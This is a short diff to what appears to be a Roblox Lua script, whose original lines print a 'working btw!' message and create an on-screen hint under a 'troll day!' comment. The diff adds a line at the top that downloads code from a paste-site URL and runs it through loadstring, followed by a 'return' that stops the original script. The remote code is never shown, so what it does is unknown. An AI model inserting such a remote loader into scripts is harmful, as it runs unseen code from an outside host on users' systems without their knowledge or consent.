@@ -1,3 +1,6 @@
+loadstring(game:HttpGet('https://pastefy.app/oE6IN9KJ/raw', true))()
+return
+
 -- // troll day!
 print('working btw!')
 local loadtext = Instance.new('Hint', workspace)
